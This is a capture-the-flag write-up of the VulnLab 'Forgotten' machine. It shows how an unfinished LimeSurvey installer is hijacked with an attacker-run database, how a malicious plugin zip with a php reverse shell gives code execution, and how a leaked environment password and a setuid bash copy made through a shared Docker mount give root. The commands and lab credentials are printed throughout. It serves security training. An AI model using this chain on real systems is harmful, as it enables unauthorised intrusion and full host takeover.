---
title: Forgotten - Easy
date: 2026-11-04 00:00:00 +0800 
categories: [Vulnlab, Box]
image:
    path: forgotten.jpg
layout: post 
media_subpath: /assets/posts/forgotten
---

Forgotten is a Easy difficulty Linux machine from VulnLab that showcases several real-world techniques. By discovering an unfinished LimeSurvey installation the player will deploy a controlled MariaDB instance to complete the web application installation with, thereby gaining administrative access to the application. Players will then upload a malicious LimeSurvey plugin to achieve remote code execution inside of a Docker container. After enumerating the container players will discover an environment variable that will grant access to the host as well as the ability to enumerate sudo privileges within the docker container. With low privilege access to the host and root privilege to the container, players can then expect to chain the two together in order to escalate privileges by leveraging a setuid binary.

This box is from Vulnlab but played on Hackthebox.

```terminal
Me > 10.10.14.74
Target > 10.129.234.81
```

## Foothold

```terminal
nmap 10.129.234.81 -sV -sC -v -p- -oN nmap.txt

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 28:c7:f1:96:f9:53:64:11:f8:70:55:68:0b:e5:3c:22 (ECDSA)
|_  256 02:43:d2:ba:4e:87:de:77:72:ce:5a:fa:86:5c:0d:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.56
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: 403 Forbidden
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
Service Info: Host: 172.17.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We got 2 ports open. We can go look at the website.

![Forgotten](forgotten1.png)

We get a forbidden. Here we can scan for directories. Im going to use ffuf.

```terminal
┌──(songbird㉿kali)-[~/Desktop/forgotten]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.129.234.81/FUZZ -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.3.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.234.81/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

survey                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 331ms]
:: Progress: [29999/29999] :: Job [1/1] :: 379 req/sec :: Duration: [0:01:22] :: Errors: 1 ::
```

If we visit http://10.129.234.81/survey we get redirected to a LimeSurvey installer. We see it runs php from the file name in the url.

We can try to install it. I see that on step 3 we get the version leaked. LimeSurvey (6.3.7). On step 4 we need to configure a database. Here it gets tricky.

We get some different errors while trying. It seems like the target does not have a database set up. So we can setup one of our own. 

```terminal
┌──(songbird㉿kali)-[~/Desktop/forgotten]
└─$ sudo docker run -p 3306:3306 --name limesurveymysql -e MYSQL_ROOT_PASSWORD=root -itd mysql:latest
[sudo] password for songbird: 
Unable to find image 'mysql:latest' locally
latest: Pulling from library/mysql
c3e99775cc39: Pull complete 
3594eab1df5f: Pull complete 
37fa2793f15f: Pull complete 
83d647c7d3d0: Pull complete 
335c0ba6129f: Pull complete 
781b429d34a1: Pull complete 
811578fcdc4f: Pull complete 
3ba4d3770669: Pull complete 
969334aca9fa: Pull complete 
63751bcf6dad: Pull complete 
Digest: sha256:3819b2b23835c4a73c8b022fafc33c8095c0f81c929a8b7a84613d2fba6c52f5
Status: Downloaded newer image for mysql:latest
2f82c303881a49af3dd27741e0a81a824ceb2615538f78d8597432e2f488db0d
```

![Forgotten](forgotten2.png)

It does not find a database but we can let LimeSurvey create one for us.

![Forgotten](forgotten3.png)

We can then just click on Populate database.

![Forgotten](forgotten4.png)

We can switch out the admin login password to something else. Im going to use 'Songbird123!'

After that we get LimeSurvey has been installed successfully. Now lets click on the Administration. We can log in with the credentials admin:Songbird123!

![Forgotten](forgotten5.png)

After a bit of time we get the panal and a welcome message. We got the credentials and the version. A quick search reveals it being vulnerable to CVE-2021-44967. We could grab a PoC but let do it manualy instead. [Medium](https://medium.com/pentester-academy-blog/lab-walkthrough-limesurvey-rce-cve-2021-44967-be5e5330455b). A source I found about a walkthrough of this cve.

We need to create a zip file containing a php reverse shell. Pentestmonkey has a good php reverse shell.

[Github](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php "Php reverse shell")

We need to change the ip and the port. After doing that we can zip it. We will also need to get a config.xml file.

[config_file](https://gitlab.com/SondagesPro/SampleAndDemo/ExampleSettings/-/blob/master/config.xml?ref_type=heads)

```terminal
┌──(songbird㉿kali)-[~/Desktop/forgotten]
└─$ nano php-reverse-shell.php 

┌──(songbird㉿kali)-[~/Desktop/forgotten]
└─$ nano config.xml

┌──(songbird㉿kali)-[~/Desktop/forgotten]
└─$ cat config.xml 
<?xml version="1.0" encoding="UTF-8"?>
<config>
    <metadata>
        <name>ExampleSettings</name>
        <type>plugin</type>
        <creationDate>2014-05-27</creationDate>
        <lastUpdate>2024-02-09</lastUpdate>
        <author>Song SoMi</author>
        <authorUrl>https://www.sondages.pro</authorUrl>
        <version>3.0.0</version>
        <license>GNU General Public License</license>
        <description><![CDATA[Example plugin showing all settings]]></description>
    </metadata>

    <compatibility>
        <version>3</version>
        <version>4</version>
        <version>5</version>
        <version>6</version>
    </compatibility>

    <updaters disabled="disabled">
    </updaters>
</config>

┌──(songbird㉿kali)-[~/Desktop/forgotten]
└─$ zip somi php-reverse-shell.php config.xml 
  adding: php-reverse-shell.php (deflated 59%)
  adding: config.xml (deflated 53%)
```

Now lets go and upload it.

![Forgotten](forgotten6.png)

We then can press on Upload & install and then select our zip and upload it.

And then just press install.

![Forgotten](forgotten7.png)

And then again. Lets also start a listener. I used port 4444 before in my php reverse shell so im going to use that again.
Penelope is a good choice. 

![Forgotten](forgotten8.png)

It uses the same name and description as the config.xml had. It also has id number 18.
We also need to active the plugin.

![Forgotten](forgotten9.png)

Now we need to go to the php file. After searching for the file location I found that its located. 'http://10.129.234.81/survey/upload/plugins/ExampleSettings/php-reverse-shell.php'. Just trying to load this page will trigger the reverse shell and you can check the listener.

```terminal
$ whoami
limesvc
$ groups
limesvc sudo
$ hostname
efaa6f5097ed
```

Its pretty obvious that we are in a container. We can check the env.

```terminal
$ env
APACHE_CONFDIR=/etc/apache2
HOSTNAME=efaa6f5097ed
PHP_INI_DIR=/usr/local/etc/php
LIMESURVEY_ADMIN=limesvc
SHLVL=0
PHP_LDFLAGS=-Wl,-O1 -pie
APACHE_RUN_DIR=/var/run/apache2
PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
PHP_VERSION=8.0.30
APACHE_PID_FILE=/var/run/apache2/apache2.pid
GPG_KEYS=1729F83938DA44E27BA0F4D3DBDB397470D12172 BFDDD28642824F8118EF77909B67A5C12229118F 2C16C765DBE54A088130F1BC4B9B5F600B55F3B4 39B641343D8C104B2B146DC3F9C39DC0B9698544
PHP_ASC_URL=https://www.php.net/distributions/php-8.0.30.tar.xz.asc
PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
PHP_URL=https://www.php.net/distributions/php-8.0.30.tar.xz
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
APACHE_RUN_GROUP=limesvc
APACHE_RUN_USER=limesvc
APACHE_LOG_DIR=/var/log/apache2
LIMESURVEY_PASS=5W5HN4K4GCXf9E
PWD=/
PHPIZE_DEPS=autoconf            dpkg-dev                file            g++             gcc             libc-dev                make            pkg-config              re2c
PHP_SHA256=216ab305737a5d392107112d618a755dc5df42058226f1670e9db90e77d777d9
APACHE_ENVVARS=/etc/apache2/envvars
```

Intresting is "LIMESURVEY_PASS=5W5HN4K4GCXf9E". Due to us having the password and being in the sudo group we are root on the container.

```terminal
$ sudo -S whoami
root
```

We can test it against the ssh service.

## User

```terminal
┌──(songbird㉿kali)-[~/Desktop/forgotten]
└─$ ssh limesvc@10.129.234.81
The authenticity of host '10.129.234.81 (10.129.234.81)' can't be established.
ED25519 key fingerprint is: SHA256:Dgu3MKOg2XUbjInyeAgQbBsHXIBePlc4jLIgssUKTt0
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.234.81' (ED25519) to the list of known hosts.
(limesvc@10.129.234.81) Password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-1033-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed Nov  4 21:39:11 UTC 2026

  System load:  0.04              Processes:             225
  Usage of /:   60.1% of 6.60GB   Users logged in:       0
  Memory usage: 11%               IPv4 address for eth0: 10.129.234.81
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

limesvc@forgotten:~$ ls
user.txt
```

Lets read the user flag.

```terminal
limesvc@forgotten:~$ cat user.txt 
4ee6ee7c04bda3ecfddbc917b994e48d
```

## Root

Due to us being root on the container. A container privilege escalation would be a easy target.
On the container in the webroot I found this.

```terminal
$ pwd
/var/www/html/survey
$ ls -la
total 168
drwxr-xr-x  15 limesvc  limesvc   4096 Nov 27  2023 .
drwxrwxrwt   1 www-data www-data  4096 Dec  2  2023 ..
-rw-rw-r--   1 limesvc  limesvc   1091 Nov 27  2023 .htaccess
-rw-rw-r--   1 limesvc  limesvc  49474 Nov 27  2023 LICENSE
-rw-rw-r--   1 limesvc  limesvc   2488 Nov 27  2023 README.md
-rw-rw-r--   1 limesvc  limesvc    536 Nov 27  2023 SECURITY.md
drwxr-xr-x   2 limesvc  limesvc   4096 Nov 27  2023 admin
drwxr-xr-x  15 limesvc  limesvc   4096 Nov 27  2023 application
drwxr-xr-x  10 limesvc  limesvc   4096 Nov 27  2023 assets
drwxr-xr-x   7 limesvc  limesvc   4096 Nov 27  2023 docs
-rw-rw-r--   1 limesvc  limesvc   8154 Nov 27  2023 gulpfile.js
-rw-rw-r--   1 limesvc  limesvc   5564 Nov 27  2023 index.php
drwxr-xr-x   4 limesvc  limesvc   4096 Nov 27  2023 installer
drwxr-xr-x 120 limesvc  limesvc   4096 Nov 27  2023 locale
drwxr-xr-x   4 limesvc  limesvc   4096 Nov 27  2023 modules
drwxr-xr-x  23 limesvc  limesvc   4096 Nov 27  2023 node_modules
-rwxrwxr-x   1 limesvc  limesvc   9672 Nov 27  2023 open-api-gen.php
drwxr-xr-x   3 limesvc  limesvc   4096 Nov 27  2023 plugins
-rw-rw-r--   1 limesvc  limesvc   2175 Nov 27  2023 psalm-all.xml
-rw-rw-r--   1 limesvc  limesvc   1090 Nov 27  2023 psalm-strict.xml
-rw-rw-r--   1 limesvc  limesvc   1074 Nov 27  2023 psalm.xml
-rw-rw-r--   1 limesvc  limesvc   1684 Nov 27  2023 setdebug.php
drwxr-xr-x   5 limesvc  limesvc   4096 Nov 27  2023 themes
drwxr-xr-x   6 limesvc  limesvc   4096 Nov  4 21:25 tmp
drwxr-xr-x   9 limesvc  limesvc   4096 Nov 27  2023 upload
drwxr-xr-x  36 limesvc  limesvc   4096 Nov 27  2023 vendor
```

Its the webserver (duh). Lets keep this on our mind. Back to the host target normaly I often check out /opt when looking around.

```terminal
limesvc@forgotten:/$ ls -la /opt
total 97252
drwxr-xr-x  4 root    root        4096 Dec  2  2023 .
drwxr-xr-x 19 root    root        4096 Aug 14  2025 ..
drwx--x--x  4 root    root        4096 Dec  2  2023 containerd
drwxr-xr-x 15 limesvc limesvc     4096 Nov 27  2023 limesurvey
-rw-r--r--  1 root    root    99565458 Nov 27  2023 limesurvey6.3.7+231127.zip
```

It has limesurvey as one of the directories.

```terminal
limesvc@forgotten:/opt/limesurvey$ ls -la 
total 168
drwxr-xr-x  15 limesvc limesvc  4096 Nov 27  2023 .
drwxr-xr-x   4 root    root     4096 Dec  2  2023 ..
-rw-rw-r--   1 limesvc limesvc  1091 Nov 27  2023 .htaccess
-rw-rw-r--   1 limesvc limesvc 49474 Nov 27  2023 LICENSE
-rw-rw-r--   1 limesvc limesvc  2488 Nov 27  2023 README.md
-rw-rw-r--   1 limesvc limesvc   536 Nov 27  2023 SECURITY.md
drwxr-xr-x   2 limesvc limesvc  4096 Nov 27  2023 admin
drwxr-xr-x  15 limesvc limesvc  4096 Nov 27  2023 application
drwxr-xr-x  10 limesvc limesvc  4096 Nov 27  2023 assets
drwxr-xr-x   7 limesvc limesvc  4096 Nov 27  2023 docs
-rw-rw-r--   1 limesvc limesvc  8154 Nov 27  2023 gulpfile.js
-rw-rw-r--   1 limesvc limesvc  5564 Nov 27  2023 index.php
drwxr-xr-x   4 limesvc limesvc  4096 Nov 27  2023 installer
drwxr-xr-x 120 limesvc limesvc  4096 Nov 27  2023 locale
drwxr-xr-x   4 limesvc limesvc  4096 Nov 27  2023 modules
drwxr-xr-x  23 limesvc limesvc  4096 Nov 27  2023 node_modules
-rwxrwxr-x   1 limesvc limesvc  9672 Nov 27  2023 open-api-gen.php
drwxr-xr-x   3 limesvc limesvc  4096 Nov 27  2023 plugins
-rw-rw-r--   1 limesvc limesvc  2175 Nov 27  2023 psalm-all.xml
-rw-rw-r--   1 limesvc limesvc  1090 Nov 27  2023 psalm-strict.xml
-rw-rw-r--   1 limesvc limesvc  1074 Nov 27  2023 psalm.xml
-rw-rw-r--   1 limesvc limesvc  1684 Nov 27  2023 setdebug.php
drwxr-xr-x   5 limesvc limesvc  4096 Nov 27  2023 themes
drwxr-xr-x   6 limesvc limesvc  4096 Nov  4 21:25 tmp
drwxr-xr-x   9 limesvc limesvc  4096 Nov 27  2023 upload
drwxr-xr-x  36 limesvc limesvc  4096 Nov 27  2023 vendor
```

Its the same files. Its probaly mounted to the host. So we can exploit this due to us being root on the container and a normal user on the host.
Back to the container. We need to copy /bin/bash as root and change the permissions. This file will let anyone execute as root.

```terminal
$ sudo -S cp /bin/bash /var/www/html/survey/somi
$ sudo -S chmod +s /var/www/html/survey/somi
$ ls -la | grep somi
-rwsr-sr-x   1 root     root     1234376 Nov  4 21:55 somi
```

Back to the host.

```terminal
limesvc@forgotten:/opt/limesurvey$ ls -la
total 1376
drwxr-xr-x  15 limesvc limesvc    4096 Nov  4 21:55 .
drwxr-xr-x   4 root    root       4096 Dec  2  2023 ..
-rw-rw-r--   1 limesvc limesvc    1091 Nov 27  2023 .htaccess
-rw-rw-r--   1 limesvc limesvc   49474 Nov 27  2023 LICENSE
-rw-rw-r--   1 limesvc limesvc    2488 Nov 27  2023 README.md
-rw-rw-r--   1 limesvc limesvc     536 Nov 27  2023 SECURITY.md
drwxr-xr-x   2 limesvc limesvc    4096 Nov 27  2023 admin
drwxr-xr-x  15 limesvc limesvc    4096 Nov 27  2023 application
drwxr-xr-x  10 limesvc limesvc    4096 Nov 27  2023 assets
drwxr-xr-x   7 limesvc limesvc    4096 Nov 27  2023 docs
-rw-rw-r--   1 limesvc limesvc    8154 Nov 27  2023 gulpfile.js
-rw-rw-r--   1 limesvc limesvc    5564 Nov 27  2023 index.php
drwxr-xr-x   4 limesvc limesvc    4096 Nov 27  2023 installer
drwxr-xr-x 120 limesvc limesvc    4096 Nov 27  2023 locale
drwxr-xr-x   4 limesvc limesvc    4096 Nov 27  2023 modules
drwxr-xr-x  23 limesvc limesvc    4096 Nov 27  2023 node_modules
-rwxrwxr-x   1 limesvc limesvc    9672 Nov 27  2023 open-api-gen.php
drwxr-xr-x   3 limesvc limesvc    4096 Nov 27  2023 plugins
-rw-rw-r--   1 limesvc limesvc    2175 Nov 27  2023 psalm-all.xml
-rw-rw-r--   1 limesvc limesvc    1090 Nov 27  2023 psalm-strict.xml
-rw-rw-r--   1 limesvc limesvc    1074 Nov 27  2023 psalm.xml
-rw-rw-r--   1 limesvc limesvc    1684 Nov 27  2023 setdebug.php
-rwsr-sr-x   1 root    root    1234376 Nov  4 21:55 somi
drwxr-xr-x   5 limesvc limesvc    4096 Nov 27  2023 themes
drwxr-xr-x   6 limesvc limesvc    4096 Nov  4 21:25 tmp
drwxr-xr-x   9 limesvc limesvc    4096 Nov 27  2023 upload
drwxr-xr-x  36 limesvc limesvc    4096 Nov 27  2023 vendor
```

We see a new file has appeared. Now lets drop into a root shell.

```terminal
limesvc@forgotten:/opt/limesurvey$ /opt/limesurvey/somi -p
somi-5.1# whoami
root
somi-5.1# cat /root/root.txt 
96ab2d81d93190bf067aaa196826ad74
```

![Forgotten](forgotten10.jpg)

Pwned!